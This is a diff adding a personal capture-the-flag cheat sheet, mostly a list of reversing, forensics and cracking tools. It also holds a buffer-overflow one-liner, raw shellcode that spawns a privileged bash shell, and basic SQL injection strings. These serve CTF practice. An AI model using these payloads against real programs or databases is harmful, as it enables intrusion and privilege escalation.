@@ -1,0 +1,107 @@
+radare2
+gdb
+gdb-peda
+objdump
+ltrace
+strace
+$?
+grep
+grep -r #grep recursif sur des dossiers
+find x --name
+cut
+xxd
+base64
+bash -c
+python -c
+nc
+strings -e -n
+hexdump -C
+identify (imagemagick)
+file
+john
+tr
+sed
+zsteg
+wget
+binwalk
+tesseract
+fcrackzip
+scapy
+wireshark
+tar xf
+unzip
+gunzip
+bunzip2
+readelf
+md5sum
+tr 'A-Za-z' 'N-ZA-Mn-za-m'  #rot13
+rot13
+nc
+testdisk
+strings data.pcap | grep -oE "CTF{.*}" #choper un ctf dans un pcap
+exiftool #meta données
+hopper disassembler
+foremost #recovering img
+hexedit / ghex
+
+python pwntools lib
+python Crypto lib (Python cryptography toolkit)
+
+sites:
+======
+    virustotal.com
+    https://www.quipqiup.com/ #decypher substituion!
+    robot.txt !! (mr. robots etc.)
+
+user-agents:
+============
+    googlebots:
+        Googlebot/2.1 (+http://www.google.com/bot.html)
+        Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+        Googlebot-Image/1.0
+
+buffer overflow:
+====================
+    #besoin de connaitre le modèle de la stack de toute façon!
+
+    python -c "import struct; print 'a'*32 + struct.pack('<I', 0x080485cb)" | ./vuln
+
+    dmesg | tail -n 1 #voir les messages de vulnerabilité de la stack
+
+    readelf #permet de connaitre l'adresse des différentes fonctions
+
+shellcode:
+==========
+    launch sh:
+        (python -c "print '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'"; cat) | ./vuln
+
+
+random:
+=======
+    open a file by inode:
+        ls -i #find inode
+        find -inum 12345 -exec cat {} \; #exec any prog with inode
+
+sql injection:
+==============
+        #string query
+    ' or 1=1;
+        #number query
+    1 or 1=1;
+
+Terms
+=====
+
+Dos
+DDoS
+Phishing
+VPN
+SQL Injections
+VPN
+Proxy
+Tor
+VPS
+Key Loggers
+Terminal
+Firewall
+Root kit
